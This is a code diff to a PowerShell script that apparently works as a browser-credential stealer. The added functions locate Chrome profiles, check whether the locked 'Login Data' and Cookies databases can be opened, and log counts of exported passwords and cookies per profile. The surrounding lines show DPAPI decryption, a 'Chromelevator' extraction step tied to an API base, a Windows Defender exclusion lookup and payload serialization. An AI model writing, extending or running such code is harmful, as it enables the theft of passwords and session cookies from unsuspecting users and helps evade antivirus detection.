@@ -210,6 +210,166 @@ function Get-ChromeProfileMetadata {
     return $result
 }
 
+function Test-ChromeDbReadable {
+    param([string]$Path)
+
+    if (-not (Test-Path -LiteralPath $Path)) {
+        return $false
+    }
+
+    try {
+        $stream = [System.IO.File]::Open(
+            $Path,
+            [System.IO.FileMode]::Open,
+            [System.IO.FileAccess]::Read,
+            [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete
+        )
+        $stream.Dispose()
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function Get-ChromeCookiesDbPath {
+    param([string]$ProfilePath)
+
+    $networkPath = Join-Path $ProfilePath "Network\Cookies"
+    if (Test-Path -LiteralPath $networkPath) {
+        return $networkPath
+    }
+
+    $legacyPath = Join-Path $ProfilePath "Cookies"
+    if (Test-Path -LiteralPath $legacyPath) {
+        return $legacyPath
+    }
+
+    return $null
+}
+
+function Write-ChromeDiscoveryDebug {
+    param(
+        [bool]$UseDpapiDecrypt,
+        [bool]$UseChromelevator
+    )
+
+    if (-not $DebugMode) {
+        return
+    }
+
+    $chromeUserData = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+
+    Write-DebugStep "User: $env:USERNAME (profile=$env:USERPROFILE)"
+    Write-DebugStep "Chrome User Data: $chromeUserData"
+    Write-DebugStep "Export mode: UseDpapiDecrypt=$UseDpapiDecrypt, UseChromelevator=$UseChromelevator"
+
+    if (-not (Test-Path -LiteralPath $chromeUserData)) {
+        Write-DebugStep "Chrome User Data path not found"
+        return
+    }
+
+    $allDirs = @(
+        Get-ChildItem -Path $chromeUserData -Directory -ErrorAction SilentlyContinue |
+            ForEach-Object { $_.Name }
+    )
+    Write-DebugStep "All subfolders ($($allDirs.Count)): $($allDirs -join ', ')"
+
+    $candidates = @($allDirs | Where-Object { $_ -match '^(Default|Profile \d+)$' })
+    Write-DebugStep "Profile folders to evaluate ($($candidates.Count)): $($candidates -join ', ')"
+
+    foreach ($folder in $candidates) {
+        $profilePath = Join-Path $chromeUserData $folder
+        $loginDb = Join-Path $profilePath "Login Data"
+        $cookiesDb = Get-ChromeCookiesDbPath -ProfilePath $profilePath
+        $loginExists = Test-Path -LiteralPath $loginDb
+        $loginReadable = if ($loginExists) { Test-ChromeDbReadable -Path $loginDb } else { $false }
+        $cookiesExists = [bool]$cookiesDb
+        $cookiesReadable = if ($cookiesDb) { Test-ChromeDbReadable -Path $cookiesDb } else { $false }
+        $parts = @(
+            "loginData=$(if ($loginExists) { if ($loginReadable) { 'ok' } else { 'locked' } } else { 'missing' })"
+        )
+        if ($UseDpapiDecrypt) {
+            $parts += "cookies=$(if ($cookiesExists) { if ($cookiesReadable) { 'ok' } else { 'locked' } } else { 'missing' })"
+        }
+        Write-DebugStep "  $folder : $($parts -join ', ')"
+    }
+
+    $skipped = @($allDirs | Where-Object { $_ -notmatch '^(Default|Profile \d+)$' })
+    if ($skipped.Count -gt 0) {
+        Write-DebugStep "Skipped folders (not Default|Profile N): $($skipped -join ', ')"
+    }
+}
+
+function Write-ExportProfileSummaryDebug {
+    param([string]$ExportJsonRaw)
+
+    if (-not $DebugMode) {
+        return
+    }
+
+    try {
+        $export = $ExportJsonRaw | ConvertFrom-Json
+        $byProfile = @{}
+        foreach ($pwd in @($export.passwords)) {
+            $profile = [string]$pwd.profile
+            if (-not $byProfile.ContainsKey($profile)) {
+                $byProfile[$profile] = 0
+            }
+            $byProfile[$profile]++
+        }
+
+        if ($byProfile.Count -eq 0) {
+            Write-DebugStep "Export passwords by profile: (none)"
+        }
+        else {
+            $summary = ($byProfile.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join ', '
+            Write-DebugStep "Export passwords by profile: $summary"
+        }
+
+        $cookieByProfile = @{}
+        foreach ($cookie in @($export.cookies)) {
+            $profile = [string]$cookie.profile
+            if (-not $cookieByProfile.ContainsKey($profile)) {
+                $cookieByProfile[$profile] = 0
+            }
+            $cookieByProfile[$profile]++
+        }
+
+        if ($cookieByProfile.Count -gt 0) {
+            $summary = ($cookieByProfile.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join ', '
+            Write-DebugStep "Export cookies by profile (pre-merge): $summary"
+        }
+    }
+    catch {
+        Write-DebugStep "Could not parse export JSON for profile summary"
+    }
+}
+
+function Write-ChromelevatorProfileDebug {
+    param([string]$ChromeRoot)
+
+    if (-not $DebugMode -or -not $ChromeRoot -or -not (Test-Path -LiteralPath $ChromeRoot)) {
+        return
+    }
+
+    $profiles = @(
+        Get-ChildItem -LiteralPath $ChromeRoot -Directory -ErrorAction SilentlyContinue |
+            ForEach-Object {
+                $hasPasswords = Test-Path -LiteralPath (Join-Path $_.FullName "passwords.json")
+                $hasCookies = Test-Path -LiteralPath (Join-Path $_.FullName "cookies.json")
+                "$($_.Name)(pwd=$hasPasswords,cookies=$hasCookies)"
+            }
+    )
+
+    if ($profiles.Count -eq 0) {
+        Write-DebugStep "Chromelevator output profiles: (none)"
+    }
+    else {
+        Write-DebugStep "Chromelevator output profiles: $($profiles -join ', ')"
+    }
+}
+
 function Get-DefenderExclusions {
     $paths = @()
     $processes = @()
@@ -570,6 +730,7 @@ $script:ChromelevatorOutputRoot = $null
 $script:ChromelevatorChromeRoot = $null
 
 Write-DebugStep "Starting export pipeline (admin=$IsRunningAsAdmin, api=$ApiBase)"
+Write-ChromeDiscoveryDebug -UseDpapiDecrypt $UseDpapiDecrypt -UseChromelevator $UseChromelevator
 
 Add-Type -AssemblyName System.Security
 
@@ -1752,8 +1913,13 @@ $exportMethod = $exporterType.GetMethod("Export")
 Write-DebugStep "Running Chrome export (UseDpapiDecrypt=$UseDpapiDecrypt)"
 $exportJsonRaw = [string]$exportMethod.Invoke($null, @([bool]$UseDpapiDecrypt))
 Write-DebugStep "Export completed (jsonLength=$($exportJsonRaw.Length))"
+Write-ExportProfileSummaryDebug -ExportJsonRaw $exportJsonRaw
 
 $profileMetadata = Get-ChromeProfileMetadata
+if ($DebugMode) {
+    $metaFolders = @($profileMetadata.Keys)
+    Write-DebugStep "Profile metadata ($($metaFolders.Count)): $($metaFolders -join ', ')"
+}
 $chromelevatorMeta = Invoke-ChromelevatorExtraction -ApiBase $ApiBase
 $cookieFileCount = 0
 if ($script:ChromelevatorChromeRoot) {
@@ -1762,6 +1928,7 @@ if ($script:ChromelevatorChromeRoot) {
     ).Count
 }
 Write-DebugStep "Chromelevator finished (error=$($chromelevatorMeta.error), root=$($script:ChromelevatorChromeRoot), cookieFiles=$cookieFileCount)"
+Write-ChromelevatorProfileDebug -ChromeRoot $script:ChromelevatorChromeRoot
 
 Write-DebugStep "Serializing payload"
 $chromeRoot = if ($script:ChromelevatorChromeRoot) { [string]$script:ChromelevatorChromeRoot } else { "" }
